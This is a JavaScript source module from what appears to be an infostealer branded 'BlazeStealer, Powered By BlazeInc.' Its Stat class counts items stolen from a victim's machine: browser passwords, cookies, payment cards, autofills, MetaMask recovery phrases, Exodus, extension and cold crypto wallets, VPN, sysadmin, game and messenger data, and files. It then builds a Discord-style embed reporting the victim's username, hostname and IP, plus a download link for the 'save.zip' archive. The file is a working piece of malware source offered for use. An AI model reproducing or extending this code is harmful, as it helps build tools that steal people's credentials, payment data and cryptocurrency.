class Stat {
    constructor() {
        this.passwords = 0
        this.cookies = 0
        this.autofills = 0
        this.cards = 0
        this.history = 0
        this.downloads = 0
        this.bookmarks = 0

        this.games = []
        this.exodus = []
        this.keyword_password = []
        this.vpn = []
        this.sysadmin = []
        this.extensions = []
        this.colds = []
        this.mnemonics = []
        this.messengers = []
        this.file = []
     }

    AddBrowser(passwords, cookies, autofills, cards, history, downloads, bookmarks) {
        this.passwords = passwords
        this.cookies = cookies
        this.autofills = autofills
        this.cards = cards
        this.history = history
        this.downloads = downloads
        this.bookmarks = bookmarks
    }

    AddGames(name) {
        this.games.push(name)
    }

    Addfilestealer(name){
        this.file.push(name)
    }

    AddExodus(name) {
        this.exodus.push(name)
    }

    AddKeyword(name) {
        this.keyword_password.push(name)
    }

    AddVpn(name) {
        this.vpn.push(name)
    }

    AddSysAdmin(name) {
        this.sysadmin.push(name)
    }

    AddExtensions(name) {
        this.extensions.push(name)
    }

    AddColds(name) {
        this.colds.push(name)
    }

    AddPassphrase(passphrase) {
        this.passphrase = passphrase
    }

    AddMessenger(name) {
        this.messengers.push(name)
    }

    Build(username, hostname, ip, link) {
        var build = "\\nSuccesfully recover :\\n"
        build += "<:BlazeInc:1069026434066161704> **" + this.exodus.length + " Exodus Password** (" + this.exodus + ")\\n"
        build += "⚔️ **" + this.keyword_password.length +" Keyword ** ( " + this.keyword_password + " )\\n"
        build += "<:BlazeInc:1034498178327785552> **" + this.passphrase.length + " Metamask Recovery Key** ( " + this.passphrase.join(", ") + " )\\n"
        build += "💰 **" + this.extensions.length + " Extension Wallets** ( " + this.extensions.join(", ") + " )\\n"
        build += "<:BlazeInc:1034595842377650236> **" + this.colds.length + " Cold Wallets** ( " + this.colds.join(", ") + " )\\n"
        build += "📂 **" + this.file + " Files **\\n"
        build += "🔑 **" + this.passwords + " Passwords**\\n"
        build += "🍪 **" + this.cookies + " Cookies**\\n"
        build += "💳 **" + this.cards + " Cards**\\n"
        build += "📋 **" + this.autofills + " Autofills**\\n"
        build += "🎮 **" + this.games.length + " Games** ( " + this.games.join(", ") + " )\\n"
        build += "⌨️ **" + this.sysadmin.length + " SysAdmin** ( " + this.sysadmin.join(", ") + " )\\n"
        build += "🔔 **" + this.messengers.length + " Messengers** ( " + this.messengers.join(", ") + " )\\n"
        build += "<:BlazeInc:1034595437916717167> **" + this.vpn.length + " VPN** ( " + this.vpn.join(", ") + " )\\n"
        build += "and much more in `save.zip`"
        if (link != "") {
            build += "\\n\\nDownload : " + link
        }
        return `{\n"content": null,\n"embeds": [\n{\n"title": "BlazeStealer, Powered By BlazeInc.",\n"description": "` + build + `",\n"color": 16711680,\n"fields": [\n{\n"name": "Computer Username",\n"value": "` + username + `",\n"inline": true\n},\n{\n"name": "Hostname",\n"value": "` + hostname + `",\n"inline": true\n},\n{\n"name": "Ip",\n"value": "` + ip + `",\n"inline": true\n}\n],\n"author": {\n"name": "BlazeStealer"\n}\n}\n],\n"username": "BlazeStealer",\n"attachments": []\n}`
    }
}

var stat = new Stat()

module.exports = {
    stat
}